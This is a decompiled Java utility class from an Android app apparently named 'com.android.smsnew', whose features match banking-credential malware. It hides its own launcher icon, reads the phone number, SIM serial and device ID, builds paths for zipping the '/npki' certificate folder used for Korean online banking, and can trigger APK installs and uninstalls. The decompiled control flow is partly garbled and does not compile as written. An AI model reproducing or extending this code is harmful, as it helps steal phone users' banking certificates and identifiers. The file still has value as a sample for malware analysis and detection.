// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.android.smsnew;

import android.app.Activity;
import android.content.*;
import android.content.pm.PackageManager;
import android.net.*;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import java.io.File;
import java.net.*;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class FileUtils
{

    public FileUtils()
    {
    }

    public static boolean checkApkExist(Context context, String s)
    {
        if(s == null || "".equals(s))
            return false;
        try
        {
            context.getPackageManager().getApplicationInfo(s, 8192);
        }
        catch(android.content.pm.PackageManager.NameNotFoundException namenotfoundexception)
        {
            return false;
        }
        return true;
    }

    public static String checkFile(File file)
    {
        File file1 = file;
_L2:
        String s;
        String s1;
        if(!file1.exists())
            return file1.getName();
        s = file1.getName();
        Matcher matcher = Pattern.compile("\\((\\d+)\\)").matcher(s);
        if(!matcher.find())
            break; /* Loop/switch isn't completed */
        int j = Integer.parseInt(matcher.group(1));
        StringBuilder stringbuilder = new StringBuilder("(");
        j + 1;
        s1 = matcher.replaceAll(stringbuilder.append(j).append(")").toString());
_L3:
        file1 = new File(file1.getParentFile(), s1);
        if(true) goto _L2; else goto _L1
_L1:
        int i = s.lastIndexOf(".");
        if(i >= 0)
        {
            String s2 = s.substring(0, i);
            String s3 = s.substring(i);
            s1 = (new StringBuilder(String.valueOf(s2))).append("(1)").append(s3).toString();
        } else
        {
            s1 = (new StringBuilder(String.valueOf(s))).append("(1)").toString();
        }
          goto _L3
        if(true) goto _L2; else goto _L4
_L4:
    }

    public static void deleteFile(File file)
    {
        if(!file.exists()) goto _L2; else goto _L1
_L1:
        if(!file.isDirectory()) goto _L4; else goto _L3
_L3:
        File afile[] = file.listFiles();
        if(afile == null || file.length() == 0L) goto _L4; else goto _L5
_L5:
        int i = 0;
_L8:
        if(i < afile.length) goto _L6; else goto _L4
_L4:
        file.delete();
_L2:
        return;
_L6:
        deleteFile(afile[i]);
        i++;
        if(true) goto _L8; else goto _L7
_L7:
    }

    public static void deleteFileList(List list)
    {
        if(list != null && list.size() != 0) goto _L2; else goto _L1
_L1:
        return;
_L2:
        Iterator iterator = list.iterator();
_L5:
        if(!iterator.hasNext()) goto _L1; else goto _L3
_L3:
        File file = new File((String)iterator.next());
        if(!file.exists()) goto _L5; else goto _L4
_L4:
        if(!file.isDirectory()) goto _L7; else goto _L6
_L6:
        File afile[] = file.listFiles();
        if(afile == null || file.length() == 0L) goto _L7; else goto _L8
_L8:
        int i = 0;
_L9:
        if(i < afile.length)
            break MISSING_BLOCK_LABEL_100;
_L7:
        file.delete();
          goto _L5
        deleteFile(afile[i]);
        i++;
          goto _L9
    }

    public static boolean detect(Context context)
    {
        ConnectivityManager connectivitymanager = (ConnectivityManager)context.getApplicationContext().getSystemService("connectivity");
        NetworkInfo networkinfo;
        if(connectivitymanager != null)
            if((networkinfo = connectivitymanager.getActiveNetworkInfo()) != null && networkinfo.isAvailable())
                return true;
        return false;
    }

    public static String getDownloadPath()
    {
        return Environment.getExternalStorageDirectory().getAbsolutePath().trim();
    }

    public static String getLocalIpAddress()
    {
        Enumeration enumeration = NetworkInterface.getNetworkInterfaces();
_L2:
        if(!enumeration.hasMoreElements())
            break MISSING_BLOCK_LABEL_72;
        Enumeration enumeration1 = ((NetworkInterface)enumeration.nextElement()).getInetAddresses();
_L4:
        if(!enumeration1.hasMoreElements()) goto _L2; else goto _L1
_L1:
        InetAddress inetaddress = (InetAddress)enumeration1.nextElement();
        if(inetaddress.isLoopbackAddress()) goto _L4; else goto _L3
_L3:
        String s = inetaddress.getHostAddress().toString();
        return s;
        SocketException socketexception;
        socketexception;
        socketexception.printStackTrace();
        return null;
    }

    public static String getPhoneNum(Context context)
    {
        if(mTelephonyMgr == null)
            mTelephonyMgr = (TelephonyManager)context.getSystemService("phone");
        String s = mTelephonyMgr.getLine1Number();
        if(isNullorEmpty(s))
            s = mTelephonyMgr.getSimSerialNumber();
        return s;
    }

    public static String getSdcardPre()
    {
        return "sdcard";
    }

    public static String getTime2FileName()
    {
        return null;
    }

    public static String getURLToName(String s)
    {
        return s.substring(1 + s.lastIndexOf("/"));
    }

    public static String getUnique(Context context)
    {
        String s = getPhoneNum(context);
        if(!TextUtils.isEmpty(s))
            return s;
        String s1 = mTelephonyMgr.getDeviceId();
        if(TextUtils.isEmpty(s1))
            s1 = "unknown";
        return s1;
    }

    public static String getZipAfterPath()
    {
        return (new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()))).append("/npki.zip".trim()).toString();
    }

    public static String getZipPath()
    {
        return (new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()))).append("/npki".trim()).toString();
    }

    public static String getnpki()
    {
        return "/npki";
    }

    public static String getnpkizip()
    {
        return "/npki.zip";
    }

    public static Boolean hasSDCard()
    {
        if("mounted".equals(Environment.getExternalStorageState()))
            return Boolean.valueOf(true);
        else
            return Boolean.valueOf(false);
    }

    public static void invisilableIcon(Activity activity)
    {
        activity.getPackageManager().setComponentEnabledSetting(new ComponentName(activity.getClass().getPackage().getName(), activity.getClass().getName()), 2, 1);
    }

    public static void invisilableIcon1(Context context)
    {
        context.getPackageManager().setComponentEnabledSetting(((Activity)context).getComponentName(), 2, 1);
    }

    public static boolean isNullorEmpty(String s)
    {
        return s == null || "".equals(s);
    }

    public static void startInstall(File file, Context context)
    {
        if(file != null && file.exists())
        {
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.setFlags(0x10000000);
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
            context.startActivity(intent);
        }
    }

    public static void uninstallAPK(String s, Context context)
    {
        Intent intent = new Intent("android.intent.action.DELETE", Uri.parse((new StringBuilder("package:")).append(s).toString()));
        intent.setFlags(0x10000000);
        context.startActivity(intent);
    }

    private static TelephonyManager mTelephonyMgr = null;

}
